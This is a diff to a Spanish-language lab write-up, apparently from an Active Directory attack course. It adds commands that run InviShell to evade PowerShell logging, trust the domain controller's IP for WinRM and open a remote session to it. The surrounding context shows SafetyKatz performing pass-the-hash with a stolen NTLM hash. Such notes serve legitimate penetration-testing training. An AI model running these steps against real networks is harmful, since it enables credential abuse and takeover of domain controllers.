@@ -966,8 +966,21 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /
 ```
 
 EL hash *NTLM* lo hemos obtenido antes a la hora de ejecutar el *SafetyKatz* en el *svcadmin*
-Desde el nuevo proceso que se nos crea ahora podemos acceder a *dcorp-dc*. Tenga en cuenta que estamos utilizando PowerShell Remoting con dirección IP y autenticación - *NegociateWithImplicitCredential*’, ya que estamos utilizando la autenticación NTLM. Por lo tanto deberemos de modificar *TrustedHosts* par ala maquina del atacante
+Desde el nuevo proceso que se nos crea ahora podemos acceder a *dcorp-dc*. Tenga en cuenta que estamos utilizando PowerShell Remoting con dirección IP y autenticación - *NegociateWithImplicitCredential*’, ya que estamos utilizando la autenticación NTLM. Por lo tanto deberemos de modificar *TrustedHosts* par ala maquina del atacante, primero deberemos de ejecutar una *InviShell*
+```shell
+[newCMD as admins privilege]
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
 ```shell
 [newCMD as admins privilege]
 Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
 ```
+
+Haremnos un exit, volveremos a ejecutar la *InviShell* y a continuacion nos conectaremos a la maquina *dcorp-dc*
+```shell
+[newCMD as admins privilege]
+Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
+```
+
+*LO - 12*
